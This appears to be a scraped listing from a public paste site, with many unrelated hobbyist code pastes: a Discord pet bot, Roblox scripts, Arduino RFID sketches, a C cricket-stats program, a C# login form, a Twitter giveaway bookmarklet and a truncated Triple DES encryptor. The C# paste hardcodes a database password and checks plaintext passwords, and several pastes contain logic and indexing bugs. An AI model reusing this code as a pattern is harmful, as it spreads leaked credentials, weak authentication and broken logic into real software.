                    await interaction.editReply({ content: null, embeds: [fedPetEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
                    await db.set(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`, amountOfTimesFedPet)
                    await db.set(`fedpettimeout_${interaction.user.id}_${interaction.guild.id}`, Date.now())
                }
            } else {
              await interaction.editReply({ content: `You Need A Pet To Feed, Heres My Pet Rock To Feed Stones To` })
            }

        }

        if (interaction.options.getSubcommand() === 'play') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const petToy = interaction.options.getString('toy-option');

                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return;
                }

                let author = await db.get(`playwithpettimeout_${interaction.user.id}_${interaction.guild.id}`);
                let timeout = 600000; //Set 10 minutes in milliseconds
                if (author !== null && timeout - (Date.now() - author) > 9000) {
                    let time = timeout - (Date.now() - author);
                    let hours = Math.floor(time / (60 * 60 * 1000)); // Calculate hours from milliseconds
                    time -= hours * 60 * 60 * 1000; // Subtract the hours in milliseconds
                    let minutes = Math.floor(time / (60 * 1000));
                    time -= minutes * 60 * 1000;
                    let seconds = Math.floor(time / 1000);
                    let timedout = new EmbedBuilder()
                        .setTitle(""Timed Out"")
                        .setDescription(`${interaction.user.globalName ?? interaction.user.username} You Have Already Played ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} Recently.\nTime Left: \`${minutes}m:${seconds}s\``)
                        .setColor(teaGreen)
                        .setFooter({ text: 'Go Feed Your Pet!' })
                        .setTimestamp();
                    interaction.editReply({ embeds: [timedout] });
                } else {
                    const playedWithPetTotal = await db.get(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`) 

                    let amountOfTimesPlayedWithPet = 0;

                    if (playedWithPetTotal) {
                        amountOfTimesPlayedWithPet = playedWithPetTotal + 1; // Increment the existing count
                    } else {
                        amountOfTimesPlayedWithPet = 1; // Set to 1 if not tracked
                    }

                    const playWithPetEmbed = new EmbedBuilder().setColor(teaGreen).setTitle(`Pet Fed`)
                        .setDescription(`
                # ${interaction.user.globalName ?? interaction.user.username} You have played with ${petNameFromDatabase ? petNameFromDatabase : 'Cannot Find Name [Internal Error]'} by using ${petToy}, They are now happy
                `)
                    await interaction.editReply({ content: null, embeds: [playWithPetEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
                    await db.set(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`, amountOfTimesPlayedWithPet)
                    await db.set(`playwithpettimeout_${interaction.user.id}_${interaction.guild.id}`, Date.now())
                }
            } else {
               await interaction.editReply({ content: `You Need A Pet To Play With, Heres My Pet Rock To Play Fetch With` })
            }

        }
        if (interaction.options.getSubcommand() === 'information') {
            const petChecker = await db.get(`petadopted_${interaction.user.id}_${interaction.guild.id}`) || false;

            if (petChecker === true) {
                const petName = await db.get(`petname_${interaction.user.id}_${interaction.guild.id}`)
                const petNameEntryFinder = petName.findIndex(entry => entry.name === ""PetName"");
                let petNameFromDatabase;

                if (petNameEntryFinder !== -1) {
                    petNameFromDatabase = petName[petNameEntryFinder].value;
                } else {
                    return;
                }

                const petType = await db.get(`pettype_${interaction.user.id}_${interaction.guild.id}`)
                const petTypeEntryFinder = petName.findIndex(entry => entry.name === ""PetType"");
                let petTypeFromDatabase;

                if (petTypeEntryFinder !== -1) {
                    petTypeFromDatabase = petType[petTypeEntryFinder].value;
                } else {
                    return;
                }


                const petStage = await db.get(`petstage_${interaction.user.id}_${interaction.guild.id}`)
                const petStageEntryFinder = petName.findIndex(entry => entry.name === ""PetStage"");
                let petStageFromDatabase;

                if (petStageEntryFinder !== -1) {
                    petStageFromDatabase = petStage[petStageEntryFinder].value;
                } else {
                    return;
                }

                const petfedTotal = await db.get(`petfedtotal_${interaction.user.id}_${interaction.guild.id}`) 
                const trackedTotalFedPet = petfedTotal > 0 ? petfedTotal : 'Animal Abuser, FEED ME';

                const playedWithPetTotal = await db.get(`playedwithpettotal_${interaction.user.id}_${interaction.guild.id}`) 
                const trackedPlayedWithPetTotal = playedWithPetTotal > 0 ? playedWithPetTotal : 'Don\'t Forget About Me, Play With me';

                const petInformationEmbed = new EmbedBuilder().setColor(teaGreen)
                    .setTitle(`Pet Information For: ${interaction.user.globalName ?? interaction.user.username}'s Pet`)
                    .addFields(
                        { name: `Name:`, value: `${petNameFromDatabase}` },
                        { name: `Type:`, value: `${petTypeFromDatabase}` },
                        { name: `Stage:`, value: `${petStageFromDatabase}` },
                        { name: `Amount Of Time Being Fed`, value: `${trackedTotalFedPet}` },
                        { name: `Amount Of Play Times:`, value: `${trackedPlayedWithPetTotal}` },
                    )
                    console.log(petInformationEmbed)
                    
                await interaction.editReply({ content: null, embeds: [petInformationEmbed], polls: null, files: [], components: [], ephemeral: false, tts: false, fetchReply: false })
            } else {
               await interaction.editReply({ content: `You Need A Pet To Get Information From With, Heres My Pet Rock, Hes Rocky, Eats Stones & Is A Elder` })
            }
        }
    },
};

//const trackedPets = await db.get(`petsgiven_${interaction.user.id}_${interaction.user.id}`) || 0;//May Add Later Down The Road"
3pudwH3e,fix for bid input - Avada theme,wpgenie,PHP,Thursday 9th of May 2024 07:21:07 AM CDT,"/* Avada bid input fix - display quantity for auctions even as they are marked as sold individually */

.auction_form .quantity.buttons_added {
    display: flex !important;
}"
5wBWyd0M,DropItem,fornakter,Lua,Thursday 9th of May 2024 07:08:11 AM CDT,"-- ServerScriptService ScriptDropItem
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local dropEvent = ReplicatedStorage:WaitForChild('DropEvent')

dropEvent.OnServerEvent:Connect(function(player)
	
	local playerModel = game.Workspace:FindFirstChild(player.Name)
	if playerModel then
		local tool = playerModel:FindFirstChildWhichIsA(""Tool"")
		if tool then
			tool.Parent = game.Workspace
		end
	end
	
end)"
mEhU2uSb,Handle,fornakter,Lua,Thursday 9th of May 2024 07:06:47 AM CDT,"-- Tool - Handle - ProximityPrompt script
local tool = script.Parent.Parent.Parent
local Prox = script.Parent
local TI = tool.Handle.TouchInterest
TI:Destroy()

Prox.Triggered:Connect(function(player)
	tool.Parent = player.Backpack
	Prox:Destroy()
end)"
2ueGthpK,final project,apl-mhd,C++,Thursday 9th of May 2024 06:29:31 AM CDT,"#include <stdio.h>
#include <stdlib.h>

struct Player
{
    char name[100];
    int age;
    char playerRole[100];
    int match;
    int totalRuns;
    int highestRun;
};

void addPlayer(FILE *file, struct Player *playerList, int n)
{
    char newline;

    for (int i = 0; i < n; i++)
    {

        fscanf(file, ""%c"", &newline);
        fscanf(file, ""%c"", &newline);

        fgets(playerList[i].name, 100, file);
        fscanf(file, ""%d"", &playerList[i].age);
        fscanf(file, ""%c"", &newline);
        fgets(playerList[i].playerRole, 100, file);
        fscanf(file, ""%d"", &playerList[i].match);
        fscanf(file, ""%d"", &playerList[i].totalRuns);
        fscanf(file, ""%d"", &playerList[i].highestRun);
    }
}

void printPlayer(struct Player player)
{
    printf(""Full Name: %s"", player.name);
    printf(""Age: %d \n"", player.age);
    printf(""Player Role: %s"", player.playerRole);

    printf(""ODI Match: %d \n"", player.match);
    printf(""Total Runs: %d \n"", player.totalRuns);
    printf(""Highest Run: %d \n\n"", player.highestRun);
}

void playerInfo(struct Player playerList[], char name[], int n)
{
    int index;
    for (int i = 0; i < n; i++)
    {
        index = i;
        int j = -1;
        while (playerList[i].name[j] != '\0')
        {
            if (playerList[i].name != name[j])
            {
                index = -1;
                break;
            }
            {
            }
            j++;
        }

        if (index != -1)
        {
            break;
        }
    }

    printPlayer(playerList[index]);
}

void showAllPlayer(struct Player playerList[], int n)
{
    printf(""All player: \n\n"");

    for (int i = 0; i < n; i++)
    {
        printf(""\n--------Player %d--------\n"", i + 1);
        printPlayer(playerList[i]);
    };
}

void mep(struct Player playerList[], int n)
{
    printf(""MOST Experienced Player: \n\n"");
    int index = -1;
    int maxMatch = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].match > maxMatch)
        {
            maxMatch = playerList[i].match;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void ncp(struct Player playerList[], int n)
{
    printf(""New Commer Player: \n\n"");
    int index = -1;
    int age = 999999;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].age < age)
        {
            age = playerList[i].age;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void tsp(struct Player playerList[], int n)
{
    printf(""Top Scorer Player: \n\n"");
    int index = -1;
    int totalRuns = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].totalRuns > totalRuns)
        {
            totalRuns = playerList[i].totalRuns;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void hhp(struct Player playerList[], int n)
{
    printf(""Hard Hitter Player: \n\n"");
    int index = -1;
    int avgRun = -1;
    for (int i = 0; i < n; i++)
    {
        int temp = playerList[i].totalRuns / playerList[i].match;
        if (temp > avgRun)
        {
            avgRun = playerList[i].totalRuns;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void hrtp(struct Player playerList[], int n)
{
    printf(""Highest Run Taker PlayerL \n\n"");

    int index = -1;
    int highestRun = -1;
    for (int i = 0; i < n; i++)
    {
        if (playerList[i].highestRun > highestRun)
        {
            highestRun = playerList[i].highestRun;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void mvp(struct Player playerList[], int n)
{
    printf(""MOST Valuable Player: \n\n"");

    int index = -1;
    int value = -1;
    for (int i = 0; i < n; i++)
    {
        int age = playerList[i].age;
        int match = playerList[i].match;
        int totalRuns = playerList[i].totalRuns;
        int highestRun = playerList[i].highestRun;

        int j = 0;
        char playerRoll[100] = {'A', 'l', 'l', 'r', 'o', 'u', 'n', 'd', 'e', 'r'};
        int allRounderValue = 50;

        while (playerList[i].playerRole[j] != '\n')
        {
            if (playerRoll[j] != playerList[i].playerRole[j])
            {
                allRounderValue = 0;
                break;
            }

            j++;
        }

        int temp = age + match + totalRuns + highestRun + (totalRuns / match) + (highestRun / age) + allRounderValue;
        if (temp > value)
        {
            value = temp;
            index = i;
        }
    }

    printPlayer(playerList[index]);
}

void allRounder(struct Player playerList[], int n)
{
    printf(""Allrounders: \n\n"");
    for (int i = 0; i < n; i++)
    {
        int j = 0;
        int index = i;
        char playerRoll[100] = {'A', 'l', 'l', 'r', 'o', 'u', 'n', 'd', 'e', 'r'};

        while (playerList[i].playerRole[j] != '\n')
        {
            if (playerRoll[j] != playerList[i].playerRole[j])
            {
                index = -1;
                break;
            }

            j++;
        }

        if (index != -1)
        {
            printPlayer(playerList[index]);
        }
    }
}

int main()
{
    char fileName[100];
    printf(""Enter File Name: "");
    scanf(""%s"", fileName);
    FILE *file;
    file = fopen(fileName, ""r"");

    int n;
    char name[100];
    struct Player playerList[100];

    fscanf(file, ""%d"", &n);

    addPlayer(file, playerList, n);

    int menu = 1;

    while (menu)
    {
        printf(""1. All Players\n"");
        printf(""2. Show A Particular player information (Provide Player Name)\n"");
        printf(""3. Show the MOST Experienced Player(MEP) \n"");
        printf(""4. Show the New Commer Player(NCP)\n"");
        printf(""5. Show the Top Scorer Player(TSP)\n"");
        printf(""6. Show the Hard Hitter Player(HHP)\n"");
        printf(""7. Show the Highest Run Taker Player(HRTP)\n"");
        printf(""8. Show the MOST Valuable Player(MVP)\n"");
        printf(""9. Show the Allrounders\n"");
        printf(""10.Exit/Quit\n"");

        scanf(""%d"", &menu);

        if (menu == 1)
        {
            showAllPlayer(playerList, n);
        }
        if (menu == 2)
        {
            playerInfo(playerList, name, n);
        }
        if (menu == 3)
        {
            mep(playerList, n);
        }
        if (menu == 4)
        {
            ncp(playerList, n);
        }
        if (menu == 5)
        {
            tsp(playerList, n);
        }
        if (menu == 6)
        {
            hhp(playerList, n);
        }
        if (menu == 7)
        {
            hrtp(playerList, n);
        }
        if (menu == 8)
        {
            mvp(playerList, n);
        }
        if (menu == 9)
        {
            allRounder(playerList, n);
        }
        if (menu == 10)
        {
            menu = 0;
            break;
        }
    }

    fclose(file);

    return 0;
}"
Ug0T8Fps,RFID Scanner rev_03,pleasedontcode,Arduino,Thursday 9th of May 2024 06:05:09 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Scanner
	- Source Code compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 11:03:51

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan card and store card number */
/****** END SYSTEM REQUIREMENTS *****/


/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 0); // Change SS and RST pins as needed

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan a RFID card"");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    Serial.println(""A card is detected!"");
    // Print UID of the card
    Serial.print(""Card UID:"");
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
      Serial.print(mfrc522.uid.uidByte[i], HEX);
    }
    Serial.println();
    mfrc522.PICC_HaltA(); // Halt PICC
  }
}

/* END CODE */"
bvPMfQak,"3 LEDs, different speed",jgoy,C++,Thursday 9th of May 2024 06:01:50 AM CDT,"#define LED_ROOD 25  // GPIO pin van LED
#define LED_GEEL 26
#define LED_GROEN 27

#define ROOD_TIJD 3131  // interval in milliseconden
#define GEEL_TIJD 1117
#define GROEN_TIJD 200

void setup() {
  pinMode(LED_ROOD, OUTPUT);
  pinMode(LED_GEEL, OUTPUT);
  pinMode(LED_GROEN, OUTPUT);
}

void loop() {
  digitalWrite(LED_ROOD, millis() % ROOD_TIJD * 2 < ROOD_TIJD ? HIGH : LOW);
  digitalWrite(LED_GEEL, millis() % GEEL_TIJD * 2 < GEEL_TIJD ? HIGH : LOW);
  digitalWrite(LED_GROEN, millis() % GROEN_TIJD * 2 < GROEN_TIJD ? HIGH : LOW);
}"
4CZ3TP21,data921,TestGuy1,JSON,Thursday 9th of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '67a055dacd7a09e7e3afe6cd3926c1c534241a80a6ee57cc71811e38d09757acb7f5d31374abee9a61d348aa3cb491c2e321ea5e78edbcc5667c0402aa051d6c3d751b7453cc2420d56134ac1fe896b1b4a388b3101a3641bcdca24f059a685c43fddbd6730502a834f9fa4739d0ae913bce06aa129e1349560fe15e5e6a916b',
  otherdata: [
    '696b0ff83f992490d999d76a92ac06ea',
    'd16415bee0153eb7c7d698fa0ba7f7f8',
    '788a37d950c6c3ece276d080b6574475',
    '2b5ae8e92395f34574398e6ca593e7d4',
    'c5fa2fba956bd25f2dd2dd7de74f1413',
    'b2f4a57af7347f8519ff392375f58c19',
    '2ac3eda2ff13e5de5b9c4eab2f41b4b4',
    'f674bab4ce037f03cdff87fa70d01fce'
  ]
}"
2C4xNyVL,RFID Scanner rev_02,pleasedontcode,Arduino,Thursday 9th of May 2024 05:57:02 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Scanner
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 10:56:36

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan card and store card number */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 0); // Change SS and RST pins as needed

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan a RFID card"");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    Serial.println(""A card is detected!"");
    // Print UID of the card
    Serial.print(""Card UID:"");
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      Serial.print(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" "");
      Serial.print(mfrc522.uid.uidByte[i], HEX);
    }
    Serial.println();
    mfrc522.PICC_HaltA(); // Halt PICC
  }
}

/* END CODE */"
pqDMePst,RFID Reader rev_01,pleasedontcode,Arduino,Thursday 9th of May 2024 05:55:27 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: RFID Reader
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2024-05-09 10:54:01

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* RC522 scan cards */
/****** END SYSTEM REQUIREMENTS *****/

/****** DEFINITION OF LIBRARIES *****/
#include <Wire.h>
#include <MFRC522.h>  // Include the MFRC522 library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF I2C PINS *****/
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SDA_D21 = 21;
const uint8_t Sceen_LCD1602I2C_I2C_PIN_SCL_D22 = 22;
const uint8_t Sceen_LCD1602I2C_I2C_SLAVE_ADDRESS = 39;

// Create an instance of the MFRC522 library
MFRC522 mfrc522(/*SS pin*/ 5, /*RST pin*/ 4);  // Change the SS and RST pins as per your wiring

void setup(void)
{
  // put your setup code here, to run once:
  Serial.begin(9600);
  SPI.begin(); // Init SPI bus
  mfrc522.PCD_Init(); // Init MFRC522 card

  Serial.println(""Scan RFID card to get the UID..."");
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  // Look for new cards
  if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial())
  {
    // Show UID on serial monitor
    Serial.print(""UID tag :"");
    String content = """";
    for (byte i = 0; i < mfrc522.uid.size; i++)
    {
      content.concat(String(mfrc522.uid.uidByte[i] < 0x10 ? "" 0"" : "" ""));
      content.concat(String(mfrc522.uid.uidByte[i], HEX));
    }
    content.toUpperCase();
    Serial.println(content);
  }
}

/* END CODE */"
zTwpM63Z,Untitled,Semount,C#,Thursday 9th of May 2024 05:44:54 AM CDT,"Metod:
private void LoginAction(object obj)
{
    string enteredLogin = Username;
    string enteredPassword = PasswordProvider.Password;

    using (NpgsqlConnection connection = DatabaseConnection.GetConnection())
    {
        connection.Open();

        string query = ""SELECT role_id, name, surname FROM employees WHERE login = @Login AND password = @Password"";
        using (NpgsqlCommand command = new NpgsqlCommand(query, connection))
        {
            command.Parameters.AddWithValue(""@Login"", enteredLogin);
            command.Parameters.AddWithValue(""@Password"", enteredPassword);

            using (var reader = command.ExecuteReader())
            {
                if (reader.Read())
                {
                    int roleId = reader.GetInt32(0);
                    string name = reader.GetString(1);
                    string surname = reader.GetString(2);

                    switch (roleId)
                    {
                        case 1: // Официант
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                WaiterWindow waiterWindow = new WaiterWindow(name, surname);
                                waiterWindow.Show();
                            });
                            break;
                        case 2: // Повар
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                ChefWindow chefWindow = new ChefWindow(name, surname);
                                chefWindow.Show();
                            });
                            break;
                        case 3: // Администратор
                            Application.Current.Dispatcher.Invoke(() =>
                            {
                                AdminWindow adminWindow = new AdminWindow(name, surname);
                                adminWindow.Show();
                            });
                            break;
                        default:
                            // Неизвестная роль
                            ShowErrorMessage = true;
                            ErrorMessage = ""Неизвестная роль. Доложите администратору."";
                            break;
                    }
                    // Закрываем текущее окно входа
                    if (obj is Window window)
                    {
                        window.Close();
                    }
                }
                else
                {
                    // Неверный логин или пароль
                    ShowErrorMessage = true;
                    ErrorMessage = ""Неверный логин или пароль."";
                }
            }
        }
    }
}


DatabaseConnection.cs:
using Npgsql;

namespace ReManage.Core
{
    public static class DatabaseConnection
    {
        private static string connectionString = ""Server=localhost;Port=5432;Database=ReManage;User Id=postgres;Password=35x45x;"";

        public static NpgsqlConnection GetConnection()
        {
            return new NpgsqlConnection(connectionString);
        }
    }
}"
VhH947Sp,For Arduino,dllbridge,C,Thursday 9th of May 2024 05:35:33 AM CDT,"#include <SoftwareSerial.h>

SoftwareSerial mySerial(10, 11); // RX, TX
#define LED_PIN 13

void setup() {
  pinMode(LED_PIN, OUTPUT);
  mySerial.begin(9600);
}

void loop() {
  if (mySerial.available()) {
    String inputString = mySerial.readString();
    if (inputString.indexOf(""SONY"") >= 0) {
      digitalWrite(LED_PIN, HIGH);
      mySerial.println(""_Pictures"");
    } else {
      digitalWrite(LED_PIN, LOW);
    }
  }
}



#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hCom;
    BOOL fSuccess;
    char *pszPortName = ""COM3""; // COM-порт Arduino
    char *pszMessage = ""SONY"";
    DWORD dwNumBytesWritten = 0;
    DWORD dwNumBytesRead = 0;
    char inbuff[10];

    // Открываем COM-порт
    hCom = CreateFile(pszPortName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hCom == INVALID_HANDLE_VALUE) {
        printf(""Failed to open COM: %dn"", GetLastError());
        return 1;
    }

    // Отправляем сообщение
    fSuccess = WriteFile(hCom, pszMessage, strlen(pszMessage), &dwNumBytesWritten, NULL);

    if (!fSuccess) {
        printf(""WriteFile failed: %dn"", GetLastError());
        return 1;
    }
    
    // Получаем ответ
    fSuccess = ReadFile(hCom, inbuff, 10, &dwNumBytesRead, NULL);
    
    if (!fSuccess) {
        printf(""ReadFile failed: %dn"", GetLastError());
        return 1;
    }
    printf(""Received: %sn"", inbuff);

    return 0;
}"
AtSRCUpQ,Twitter Giveaway Picker,MeckeOfficial,JavaScript,Thursday 9th of May 2024 05:10:29 AM CDT,"javascript: (function() {
    let hrefList = [];
    let scrollAttempts = 0;

    function processSections() {
        const sections = document.getElementsByTagName('section');
        for (let i = 0; i < sections.length; i++) {
            const section = sections[i];
            if (section.hasAttribute('aria-labelledby')) {
                const ariaLabelledById = section.getAttribute('aria-labelledby');
                if (ariaLabelledById.startsWith('accessible-list')) {
                    const h1Elements = section.getElementsByTagName('h1');
                    for (let j = 0; j < h1Elements.length; j++) {
                        const h1Element = h1Elements[j];
                        if (h1Element.getAttribute('role') === 'heading' && (h1Element.textContent.trim() === 'Reposts' || h1Element.textContent.trim() === 'Likes' || h1Element.textContent.trim() === 'Quotes')) {
                            const cellInnerDivs = section.querySelectorAll('[data-testid=""cellInnerDiv""]');
                            cellInnerDivs.forEach(cellInnerDiv => {
                                const hrefRegex = /href=""([^""]*)""/;
                                const match = cellInnerDiv.innerHTML.match(hrefRegex);
                                if (match && match[1]) {
                                    const href = match[1];
                                    if (!hrefList.includes(href)) {
                                        hrefList.push(href);
                                        updateHrefsCountDisplay();
                                        console.log(""New href added:"", href);
                                    }
                                }
                            });
                            break;
                        }
                    }
                }
            }
        }
    }

    function pickWinner() {
        if (hrefList.length > 0) {
            const randomIndex = Math.floor(Math.random() * hrefList.length);
            const selectedHref = hrefList[randomIndex];
            winnerButton.textContent = selectedHref;
            winnerButton.href = selectedHref;
            hrefList.splice(randomIndex, 1);
            updateHrefsCountDisplay();
        } else {
            winnerButton.textContent = ""No entries available"";
            winnerButton.removeAttribute('href');
        }
    }

    function handlePickWinner() {
        hrefList = [];
        processSections();
        const scrollInterval = setInterval(function() {
            window.scrollBy(0, window.innerHeight);
            scrollAttempts++;
            if (scrollAttempts >= 3) {
                scrollAttempts = 0;
                const prevLength = hrefList.length;
                processSections();
                if (hrefList.length === prevLength) {
                    clearInterval(scrollInterval);
                    console.log(""Reached end. List of hrefs:"", hrefList);
                    pickWinner();
                }
            }
        }, 1000);
    }

    function handleReroll() {
        pickWinner();
    }

    function updateHrefsCountDisplay() {
        hrefCountDisplay.textContent = `Total hrefs: ${hrefList.length}`;
    }
    const pickWinnerButton = document.createElement('button');
    pickWinnerButton.textContent = 'Pick a Winner';
    pickWinnerButton.addEventListener('click', handlePickWinner);
    document.body.appendChild(pickWinnerButton);
    pickWinnerButton.style.position = 'fixed';
    pickWinnerButton.style.top = '10px';
    pickWinnerButton.style.left = '10px';
    pickWinnerButton.style.backgroundColor = 'green';
    pickWinnerButton.style.color = 'white';
    pickWinnerButton.style.padding = '10px 20px';
    pickWinnerButton.style.border = 'none';
    pickWinnerButton.style.borderRadius = '5px';
    pickWinnerButton.style.cursor = 'pointer';
    const rerollButton = document.createElement('button');
    rerollButton.textContent = 'Reroll';
    rerollButton.addEventListener('click', handleReroll);
    document.body.appendChild(rerollButton);
    rerollButton.style.position = 'fixed';
    rerollButton.style.top = '10px';
    rerollButton.style.left = '150px';
    rerollButton.style.backgroundColor = 'blue';
    rerollButton.style.color = 'white';
    rerollButton.style.padding = '10px 20px';
    rerollButton.style.border = 'none';
    rerollButton.style.borderRadius = '5px';
    rerollButton.style.cursor = 'pointer';
    const winnerButton = document.createElement('a');
    winnerButton.textContent = '- None -';
    document.body.appendChild(winnerButton);
    winnerButton.style.position = 'fixed';
    winnerButton.style.top = '50px';
    winnerButton.style.left = '10px';
    winnerButton.style.backgroundColor = 'blue';
    winnerButton.style.color = 'white';
    winnerButton.style.padding = '10px 20px';
    winnerButton.style.border = 'none';
    winnerButton.style.borderRadius = '5px';
    winnerButton.style.cursor = 'pointer';
    const hrefCountDisplay = document.createElement('span');
    hrefCountDisplay.textContent = `Total hrefs: ${hrefList.length}`;
    document.body.appendChild(hrefCountDisplay);
    hrefCountDisplay.style.position = 'fixed';
    hrefCountDisplay.style.top = '90px';
    hrefCountDisplay.style.left = '10px';
    hrefCountDisplay.style.color = 'black';
})();"
9E07kswb,DES_PAO,cataleena,C++,Thursday 9th of May 2024 05:01:56 AM CDT,"#include <iostream>
#include <fstream>
#include <cstdint>
#include <chrono>
#include <omp.h> // Include OpenMP header
#include ""keys.h""
#include ""permutation.h""
#include ""sbox.h""

class TripleDES {
public:
    TripleDES(const uint64_t* key1, const uint64_t* key2, const uint64_t* key3) : key1(key1), key2(key2), key3(key3) {
        obtainRoundKeys(*key1, roundKeys1, 16);
        obtainRoundKeys(*key2, roundKeys2, 16);
        obtainRoundKeys(*key3, roundKeys3, 16);
    }

    void encryptFile(const char* inputFile, const char* outputFile);
    uint64_t generateNextCounterValue(uint64_t counter);
    uint64_t getMillisTimestamp();

private:
    const uint64_t* key1;
    const uint64_t* key2;
    const uint64_t* key3;
    unsigned long long roundKeys1[16], roundKeys2[16], roundKeys3[16];

    void encryptBlocks(const uint64_t* counter, uint64_t* ciphertextBlock);
};

void TripleDES::encryptFile(const char* inputFile, const char* outputFile) {
    std::ifstream inFile(inputFile, std::ios::binary);
    std::ofstream outFile(outputFile, std::ios::binary);

    if (!inFile.is_open() || !outFile.is_open()) {
        std::cerr << ""Error opening files."" << std::endl;
        return;
    }

    constexpr size_t blockSize = 8; // 64 bits
    uint64_t plaintextBlock[8], ciphertextBlock[8];
    uint64_t counter[8] = {0, 1, 2, 3, 4, 5, 6, 7}; // Initial counter values
    bool keepProcessing = true;

#pragma omp parallel // Start parallel region
    {
        while (keepProcessing) {
            // Read multiple blocks in a thread-safe manner
            bool readSuccessful = true;
#pragma omp critical
            {
                for (int i = 0; i < 8; ++i) {
                    readSuccessful &= inFile.read(reinterpret_cast<char*>(&plaintextBlock[i]), blockSize).good();
                }
            }

            if (!readSuccessful) {
                keepProcessing = false;
            }

            // Encrypt multiple blocks in parallel
            encryptBlocks(counter, ciphertextBlock);

            // Write the ciphertext blocks in a thread-safe manner
#pragma omp critical
            {
                if (keepProcessing) {
                    for (int i = 0; i < 8; ++i) {
